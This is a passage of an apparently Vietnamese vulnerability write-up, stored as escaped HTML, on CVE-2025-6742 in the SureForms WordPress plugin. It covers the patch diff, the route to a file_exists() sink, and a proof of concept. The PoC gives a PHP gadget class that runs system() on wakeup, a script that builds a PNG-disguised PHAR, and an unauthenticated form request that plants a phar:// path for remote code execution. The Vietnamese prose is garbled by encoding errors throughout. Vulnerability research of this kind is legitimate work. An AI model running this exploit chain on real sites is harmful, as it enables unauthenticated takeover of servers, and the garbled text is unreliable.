{&#xA;    unlink( $file_path );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêo·∫°n code n√†y ki·ªÉm tra s·ª± t·ªìn t·∫°i c·ªßa file b·∫±ng &lt;code&gt;file_exists()&lt;/code&gt; v√† s·ª≠ d·ª•ng &lt;code&gt;unlink()&lt;/code&gt; ƒë·ªÉ x√≥a n·∫øu n√≥ t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi trong b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi trong b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#39; alt=&#34;Diff&#34; height=&#34;602&#34; width=&#34;1892&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi trong b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong b·∫£n v√°, ƒëo·∫°n code tr√™n ƒë∆∞·ª£c thay th·∫ø b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// Delete the file from the uploads directory.&#xA;Helper::delete_upload_file_from_subdir( $file_url, &amp;#39;sureforms/&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function delete_upload_file_from_subdir( $file_url, $subdir = &amp;#39;sureforms/&amp;#39; ) {&#xA;    // Decode the file URL.&#xA;    $file_url = urldecode( $file_url );&#xA;&#xA;    // Check if the file URL is empty.&#xA;    if ( empty( $file_url ) || ! is_string( $file_url ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Normalize and sanitize the subdirectory.&#xA;    $subdir = trailingslashit( sanitize_text_field( $subdir ) );&#xA;&#xA;    // Get the base upload directory.&#xA;    $upload_dir       = wp_upload_dir();&#xA;    $base_upload_path = trailingslashit( $upload_dir[&amp;#39;basedir&amp;#39;] ) . $subdir;&#xA;&#xA;    // Extract only the filename from URL.&#xA;    $filename = basename( $file_url );&#xA;&#xA;    // Construct the full file path.&#xA;    $file_path = $base_upload_path . $filename;&#xA;&#xA;    // Resolve real paths.&#xA;    $real_file_path = realpath( $file_path );&#xA;    $real_base_path = realpath( $base_upload_path );&#xA;&#xA;    // Security check: ensure file is inside the target subdir.&#xA;    if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Delete if file exists.&#xA;    if ( file_exists( $real_file_path ) ) {&#xA;        return unlink( $real_file_path );&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m m·ªõi &lt;code&gt;delete_upload_file_from_subdir()&lt;/code&gt; th·ª±c hi·ªán nhi·ªÅu b∆∞·ªõc ki·ªÉm tra b·∫£o m·∫≠t, ch·ªâ cho ph√©p x√≥a file n·∫±m trong th∆∞ m·ª•c &lt;code&gt;uploads/sureforms/&lt;/code&gt;, v·ªõi t√™n file h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Theo nh∆∞ m√¥ t·∫£ th√¨ CVE n√†y li√™n quan ƒë·∫øn l·ªó h·ªïng PHP Object Injection m√† sink ·ªü ƒë√¢y l√† h√†m &lt;code&gt;file_exists()&lt;/code&gt; th√¨ ch·ªâ c√≥ x·∫£y ra v·ªõi tr∆∞·ªùng h·ª£p &lt;strong&gt;PHAR Deserialization&lt;/strong&gt;, t·ª©c &lt;code&gt;$file_path&lt;/code&gt; ·ªü ƒë√¢y ph·∫£i thu·ªôc d·∫°ng &lt;code&gt;phar://phar_file&lt;/code&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public static function delete_entry_files( $entry_id ) {&#xA;    if ( ! $entry_id ) {&#xA;        return;&#xA;    }&#xA;    // Get the entry data to get the file URLs.&#xA;    $form_data = Entries::get_form_data( $entry_id );&#xA;    if ( empty( $form_data ) ) {&#xA;        return;&#xA;    }&#xA;    foreach ( $form_data as $field_name =&amp;gt; $value ) {&#xA;        // Continue to the next iteration if the field name does not contain &amp;#39;srfm-upload&amp;#39; and value is not an array.&#xA;        if ( false === strpos( $field_name, &amp;#39;srfm-upload&amp;#39; ) &amp;amp;&amp;amp; ! is_array( $value ) ) {&#xA;            continue;&#xA;        }&#xA;        foreach ( $value as $file_url ) {&#xA;            // If the file URL is empty, skip to the next iteration.&#xA;            if ( empty( $file_url ) ) {&#xA;                continue;&#xA;            }&#xA;            $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) );&#xA;            // Delete the file if it exists.&#xA;            if ( file_exists( $file_path ) ) {&#xA;                unlink( $file_path );&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau khi xem qua logic c·ªßa h√†m &lt;code&gt;delete_entry_files()&lt;/code&gt;, t√¥i nh·∫≠n th·∫•y c√°c t·ª´ kh√≥a nh∆∞ &lt;code&gt;entries&lt;/code&gt; xu·∫•t hi·ªán kh√° nhi·ªÅu. C√≥ s·ª± tr√πng h·ª£p ·ªü ƒë√¢y:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#34; title=&#34;Entry trong UI&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry.png&#34; data-sub-html=&#34;&lt;h2&gt;Entry&lt;/h2&gt;&lt;p&gt;Entry trong UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#39; alt=&#34;Entry&#34; height=&#34;636&#34; width=&#34;1342&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entry trong UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;C√≥ v·∫ª ƒë√∫ng, nh∆∞ng nh∆∞ b·∫°n th·∫•y th√¥ng b√°o &lt;code&gt;&amp;quot;No records found&amp;quot;&lt;/code&gt;, ch∆∞a c√≥ d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã. V·∫≠y ta th√™m nh∆∞ n√†o?&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_data = Entries::get_form_data( $entry_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh√¨n v√†o t√™n h√†m ƒë∆∞·ª£c g·ªçi: &lt;code&gt;get_form_data&lt;/code&gt; th√¨ kh·∫£ nƒÉng cao d·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ form do client submit v√¨ l·ªó h·ªïng n√†y ƒë∆∞·ª£c c√¥ng b·ªë l√† &lt;strong&gt;Unauthenticated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th·ª≠ t·∫°o form b·∫±ng ch·ª©c nƒÉng c·ªßa plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#34; title=&#34;T·∫°o form&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;T·∫°o form&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;998&#34; width=&#34;1343&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o form&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫°o post v√† embed shortcode c·ªßa form v·ª´a t·∫°o:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#34; title=&#34;Embed Shortcode&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/embed.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed&lt;/h2&gt;&lt;p&gt;Embed Shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#39; alt=&#34;Embed&#34; height=&#34;507&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed Shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p form ƒë∆∞·ª£c t·∫°o v√† submit d·ªØ li·ªáu b·∫•t k·ª≥:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 730&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field&amp;#34;&#xA;&#xA;testing&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#34; title=&#34;Submit form t·ª´ Unauthenticated user&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/submit.png&#34; data-sub-html=&#34;&lt;h2&gt;Capture request&lt;/h2&gt;&lt;p&gt;Submit form t·ª´ Unauthenticated user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#39; alt=&#34;Capture request&#34; height=&#34;861&#34; width=&#34;1496&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Submit form t·ª´ Unauthenticated user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Response tr·∫£ v·ªÅ m·ªôt s·ªë tr∆∞·ªùng nh∆∞: &lt;strong&gt;tr·∫°ng th√°i&lt;/strong&gt; v√† &lt;strong&gt;id&lt;/strong&gt; c·ªßa submit.&lt;/p&gt;&#xA;&lt;p&gt;T√™n &lt;code&gt;delete_entry_files&lt;/code&gt; ƒë·ªÅ c·∫≠p ƒë·∫øn vi·ªác x√≥a m·ªôt entry, ta th·ª≠ ƒë·∫∑t breakpoint ƒë·∫ßu h√†m v√† th·ª≠ x√≥a 1 entry.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; title=&#34;Debugger ho·∫°t ƒë·ªông khi x√≥a entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; data-sub-html=&#34;&lt;h2&gt;Entry Delete&lt;/h2&gt;&lt;p&gt;Debugger ho·∫°t ƒë·ªông khi x√≥a entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#39; alt=&#34;Entry Delete&#34; height=&#34;1082&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger ho·∫°t ƒë·ªông khi x√≥a entry&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp t·ª•c debug&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#34; title=&#34;G√°i tr·ªã c·ªßa $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;G√°i tr·ªã c·ªßa $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#39; alt=&#34;Value&#34; height=&#34;747&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;G√°i tr·ªã c·ªßa $value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y &lt;code&gt;$value&lt;/code&gt; l√† gi√° tr·ªã do ta ki·ªÉm so√°t. &lt;code&gt;$value&lt;/code&gt; c·∫ßn ph·∫£i l√† m·ªôt m·∫£ng ƒë·ªÉ n√≥ kh√¥ng b·ªã b·ªè qua &lt;code&gt;continue&lt;/code&gt; v√† ƒë·ªÉ &lt;code&gt;file_exists()&lt;/code&gt; c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ &lt;code&gt;$value&lt;/code&gt; l√† m·ªôt m·∫£ng, ta submit v·ªõi name ch·ª©a &lt;code&gt;[]&lt;/code&gt; ·ªü cu·ªëi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;testing&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#34; title=&#34;G√°i tr·ªã c·ªßa $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value1.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;G√°i tr·ªã c·ªßa $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#39; alt=&#34;Value&#34; height=&#34;891&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;G√°i tr·ªã c·ªßa $value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi ƒë√£ debug ƒë∆∞·ª£c r·ªìi th√¨ ta s·∫Ω th·∫•y lu·ªìng d·∫´n t·ªõi sink:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client submit form&amp;#34;] &#xA;    --&amp;gt; B[&amp;#34;Admin delete entry&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WordPress hook: admin_init&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;handle_entry_actions&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Entries_List_Table::handle_entry_status()&amp;#34;]&#xA;E -- $action=delete --&amp;gt; F[&amp;#34;Entries_List_Table::delete_entry_files()&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;$value is array&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;call file_exists( $file_path )&amp;#34;] --&amp;gt; L[&amp;#34;RCE: PHAR Deserialization&amp;#34;]&#xA;G -- No --&amp;gt; K[&amp;#34;continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng admin account ƒë·ªÉ t·∫°o form v√† th√™m v√†o post&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o 1 PHP file &lt;code&gt;create_phar.php&lt;/code&gt; v·ªõi code sau:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// ƒê·ªãnh nghƒ©a class Evil v·ªõi thu·ªôc t√≠nh v√† h√†m __wakeup&#xA;class Evil&#xA;{&#xA;    // Thu·ªôc t√≠nh command ch·ª©a l·ªánh h·ªá th·ªëng s·∫Ω th·ª±c thi&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;&#xA;    // H√†m __wakeup() ƒë∆∞·ª£c g·ªçi khi object n√†y b·ªã unserialize&#xA;    public function __wakeup(): void&#xA;    {&#xA;        // Khi unserialize, s·∫Ω th·ª±c thi l·ªánh trong $command v√† d·ª´ng ch∆∞∆°ng tr√¨nh&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&#xA;&#xA;// T·∫°o m·ªôt file PHAR m·ªõi t√™n poc.phar&#xA;$phar = new Phar(&amp;#39;poc.phar&amp;#39;);&#xA;&#xA;// B·∫Øt ƒë·∫ßu ghi d·ªØ li·ªáu v√†o PHAR (buffering)&#xA;$phar-&amp;gt;startBuffering();&#xA;&#xA;// Th√™m m·ªôt entry gi·∫£ t√™n test.png v·ªõi n·ªôi dung &amp;#34;text&amp;#34;&#xA;$phar-&amp;gt;addFromString(&amp;#39;test.png&amp;#39;, &amp;#39;text&amp;#39;);&#xA;&#xA;// ƒê·∫∑t stub cho PHAR: b·∫Øt ƒë·∫ßu b·∫±ng magic bytes c·ªßa PNG ƒë·ªÉ gi·∫£ d·∫°ng file ·∫£nh,&#xA;// sau ƒë√≥ c√≥ ƒëo·∫°n PHP __HALT_COMPILER() ƒë·ªÉ ƒë√°nh d·∫•u k·∫øt th√∫c stub&#xA;$phar-&amp;gt;setStub(&amp;#34;\x89PNG\r\n\x1a\n&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;);&#xA;&#xA;// Ghi metadata v√†o PHAR: ·ªü ƒë√¢y l√† m·ªôt object Evil ƒë√£ kh·ªüi t·∫°o&#xA;// Metadata s·∫Ω ƒë∆∞·ª£c serialize, v√† n·∫øu b·ªã unserialize s·∫Ω k√≠ch ho·∫°t __wakeup()&#xA;$phar-&amp;gt;setMetadata(new Evil());&#xA;&#xA;// K·∫øt th√∫c ghi, flush d·ªØ li·ªáu ra file poc.phar&#xA;$phar-&amp;gt;stopBuffering();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;T·∫°o PHAR file &lt;code&gt;poc.phar&lt;/code&gt; b·∫±ng c√°ch ch·∫°y  &lt;code&gt;php --define phar.readonly=0 create_phar.php&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;phar.readonly&lt;/code&gt; l√† m·ªôt directive trong PHP (c·∫•u h√¨nh c·ªßa extension Phar). M·∫∑c ƒë·ªãnh gi√° tr·ªã c·ªßa n√≥ l√† 1 (readonly) kh√¥ng th·ªÉ t·∫°o file. Khi mu·ªën t·∫°o file PHAR, c·∫ßn t·∫Øt ch·∫ø ƒë·ªô readonly b·∫±ng c√°ch th√™m option &lt;code&gt;phar.readonly=0&lt;/code&gt; ho·∫∑c c·∫•u h√¨nh trong &lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;ƒê·ªïi t√™n &lt;code&gt;poc.phar&lt;/code&gt; th√†nh &lt;code&gt;poc.png&lt;/code&gt; v√¨ th√¥ng th∆∞·ªùng c√°c tr∆∞·ªùng h·ª£p s·∫Ω ch·∫•p nh·∫≠n upload file ·∫£nh thay v√¨ &lt;code&gt;.phar&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Upload &lt;code&gt;poc.jpg&lt;/code&gt; b·∫±ng Tr√¨nh ch·ªânh s·ª≠a ph∆∞∆°ng ti·ªán. L∆∞u √Ω ƒë∆∞·ªùng d·∫´n c·ªßa n√≥ trong &lt;code&gt;wp-content/uploads&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request submit form:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/2025/11/19/form-testing/&#xA;X-WP-Nonce: 2c506366a5&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Length: 775&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-3=1763365761&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&#xA;d3b9273370&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&#xA;/2025/11/19/form-testing/&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;form-id&amp;#34;&#xA;&#xA;123&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;Content-Disposition: form-data; name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&#xA;phar://../wp-content/uploads/2025/11/poc.png&#xA;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Khi admin x√≥a entry ƒë√£ upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; 